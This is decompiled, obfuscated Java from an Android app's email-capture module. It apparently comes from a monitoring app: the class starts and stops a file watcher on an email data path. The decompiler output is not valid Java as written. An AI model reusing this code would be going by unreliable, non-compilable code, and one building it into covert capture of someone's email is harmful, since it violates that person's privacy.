package com.vvt.capture.email.b.a;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.capture.email.b.c;
import com.vvt.io.m;
import java.io.File;

public class a
  implements e, m
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private b d;
  private i e;
  private boolean f;
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    this.f = true;
    this.e = parami;
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    bool = a;
    if (bool) {}
    try
    {
      bool = b;
      if (bool) {}
      localb = this.d;
      if (localb != null)
      {
        localb = this.d;
        localb.stopWatching();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        b localb;
        bool = c;
        if (!bool) {}
      }
    }
    localb = null;
    this.d = null;
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2) {}
  
  public void b()
  {
    bool = a;
    if (bool) {}
    bool = b;
    if (bool) {}
    bool = false;
    b localb = null;
    try
    {
      this.f = false;
      localb = this.d;
      if (localb != null)
      {
        localb = this.d;
        localb.stopWatching();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    localb = null;
    this.d = null;
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString1, String paramString2)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = c.a;
    Object localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool2 = ((File)localObject2).exists();
    if (bool2)
    {
      localObject2 = this.d;
      if (localObject2 == null)
      {
        bool2 = b;
        if (bool2) {}
        localObject2 = new com/vvt/capture/email/b/a/b;
        ((b)localObject2).<init>(this, (String)localObject1);
        this.d = ((b)localObject2);
        localObject1 = this.d;
        ((b)localObject1).startWatching();
      }
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public void c(String paramString1, String paramString2) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/removeFromPath/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */